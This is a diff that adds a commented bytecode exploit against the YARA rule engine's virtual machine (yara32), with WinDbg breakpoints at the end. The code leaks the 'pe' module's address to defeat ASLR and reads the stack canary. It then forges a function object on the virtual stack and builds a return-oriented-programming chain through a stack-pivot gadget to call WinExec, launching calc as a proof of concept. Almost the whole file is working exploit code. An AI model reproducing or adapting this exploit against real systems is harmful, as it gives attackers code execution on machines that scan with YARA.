@@ -1,0 +1,174 @@
+; Virtual MEM indexes used:
+
+; 1 : "pe" module addr
+; 2 : VSTACK addr
+; 3 : canary value
+; 4 : yara base addr
+; 5 : WinExec addr
+
+
+; ============= start =============
+OP_PUSH         raw     0xBB22CC99          ;    magic to find the stack in the heap
+
+OP_IMPORT       ascii   "pe"                ;    add `pe` module to hashtable
+OP_OBJ_LOAD     ascii   "pe"                ;    load address of module obj to stack
+OP_POP_M        raw     1                   ;    dont need leak of uninitialized mem, OK to overwrite
+
+OP_PUSH_M       raw     1                   ;    pe module
+OP_OBJ_FIELD    ascii   "is_dll"            ;    function for aslr bypass
+OP_PUSH         raw     28                  ;    offset to function pointer of is_dll
+OP_INT_ADD
+OP_PUSH         raw     0x38                ;    offset fix for absolute read
+OP_INT_SUB
+OP_COUNT                                    ;    read address of is_dll
+OP_PUSH         raw     0x16860             ;    offset to base. in VS: 0x32650
+OP_INT_SUB               
+OP_POP_M        raw     4                   ;    save module base address
+
+
+OP_PUSH_M       raw     1
+OP_PUSH         raw     0x20490             ;    offset option 1
+OP_INT_SUB
+OP_POP_M        raw     2                   ;    address of stack, maybe
+
+
+OP_PUSH_M       raw     1                   ;    (pe module addr)
+OP_PUSH         raw     0x38                ;    offset for absolute read
+OP_INT_SUB
+OP_COUNT                                    ;    read canary to stack
+OP_PUSH         raw     0xFFFFFFFF          ;    just in case it was signed extended to 64bit
+OP_BITWISE_AND
+OP_POP_M        raw     3                   ;    save canary
+
+
+; ============= test virtual stack was found =============
+OP_PUSH_M       raw     2                   ;    vstack
+OP_PUSH         raw     0x38                ;    offset for absolute read
+OP_INT_SUB
+OP_COUNT
+OP_PUSH         raw     0xFFFFFFFF          ;    just in case; signed
+OP_BITWISE_AND
+
+OP_BITWISE_XOR
+OP_JFALSE       reloc   +59                 ;    11+6*8 ; failed to read it, halt later will fail
+
+
+; ============= try to find virtual using a different offset =============
+OP_PUSH_M       raw     1  
+OP_PUSH         raw     0x20450             ;    offset option 2
+OP_INT_SUB
+OP_POP_M        raw     2                   ;    address of stack, maybe
+
+OP_PUSH_M       raw     2                   ;    vstack
+OP_PUSH         raw     0x38                ;    offset for absolute read
+OP_INT_SUB
+OP_COUNT
+OP_PUSH         raw     0xFFFFFFFF          ;    just in case; signed
+OP_BITWISE_AND
+
+OP_BITWISE_XOR
+OP_JFALSE       reloc   +2                  ;    failed to read it, halt 
+OP_POP
+OP_HALT                                     ;    ERROR: could not find vstack
+
+OP_POP                                      ;    cleanup xor result
+
+
+; ============= build fake function object on virtual stack =============
+; {
+;    DWORD      canary
+;    BYTE       type          # ignored, should be set OBJECT_TYPE_FUNCTION (5)
+;    BYTE[3]    padding       
+;    CHAR*      identifier    # ignored
+;    VOID*      parent        # ignored
+;    VOID*      data          # ignored
+
+;    void*      return_obj;   # ignored
+;    struct
+;    {
+;        CHAR*      arguments_fmt       # length must be equal to ROP on the vstack (in qwords), actual values don't matter 
+;        VOID*      code;               # typedef int (*OP_CALL_TARGET)(void*, void*, void*);
+;    } prototypes[1]                    # should be an array of 10 prototypes, but I make sure OP_CALL matches the first one
+; }
+
+OP_PUSH_M       raw     3                   ;    sets `canary`, `type`, `padding`
+OP_PUSH         ascii   "my_rop"            ;    sets `identifier`, `parent`
+OP_PUSH         raw     0                   ;    sets `data`, `return_obj`
+OP_PUSH         ascii   "iiiii"             ;    sets `args_format`. must match the format specified in OP_CALL later on
+
+;    sets `code` to the one-gadget which will trigger ROP
+OP_PUSH         raw     0x963B9             ;    add esp 0f8h; ret 
+OP_PUSH_M       raw     4                   ;    module base
+OP_INT_ADD
+OP_PUSH         raw     32
+OP_SHL
+OP_BITWISE_OR
+
+
+; ============= find winexec =============
+;    TODO: implement better
+OP_PUSH         raw    0xCB0AC              ;    addr of GetProcAddress
+OP_PUSH_M       raw    4                    ;    base address of yara
+OP_INT_ADD
+
+OP_PUSH         raw    0x38                 ;    offset for absolute read
+OP_INT_SUB
+OP_COUNT
+
+OP_PUSH         raw     0xFFFFFFFF          ;    just in case; signed
+OP_BITWISE_AND
+OP_PUSH         raw     0x0003eaa0          ;    offset of winexec on my machine from getprocaddress
+OP_INT_ADD  
+OP_POP_M        raw     5    
+
+
+; ============= build ROP on virtual stack =============
+;    TODO: replace padding with retpoline
+OP_PUSH_M       raw     2                   ;    fakeobj, required here for the OP_CALL later
+OP_PUSH         raw     0xBBBBBBBBAAAAAAAA  ;    padding
+OP_PUSH         raw     0xDDDDDDDDCCCCCCCC  ; 
+OP_PUSH         raw     0x00000000EEEEEEEE  ; 
+OP_PUSH_M       raw     5                   ;    winexec
+OP_PUSH         raw     32
+OP_SHL
+OP_BITWISE_OR
+
+;    ret address to exit process
+OP_PUSH         raw     0xCA33E             ;    offset to exit func wrapper from crt
+OP_PUSH_M       raw     4
+OP_INT_ADD
+
+;    args for winexec
+OP_PUSH         ascii   "calc"
+OP_PUSH         raw     32
+OP_SHL  
+OP_BITWISE_OR
+OP_PUSH         raw     5                   ;    SW_SHOW
+
+;    run ROP
+OP_CALL         ascii   "iiiii"             ;    arglist format
+
+
+; ============= end of code =============
+;    should not reach here
+;    virtual stack pointer probably won't be 0
+OP_NOP
+OP_HALT
+
+
+; ============= useful WinDbg breakpoints =============
+
+; OP_HALT
+; bp yara32+8E8B
+
+; yr_execute_code
+; bp yara32+8D27 ".printf \"stack: %08x\\n\", eax;g"
+
+; OP_OBJ_LOAD
+;  bp yara32+A169 ".printf \"module: %08x\\n\", eax;g"
+
+; switch
+; bp yara32+8E77 ".printf \"op: %d\\n\", al+1;g"
+
+; call function - rop
+; bp yara32+AA7D  "u eax"
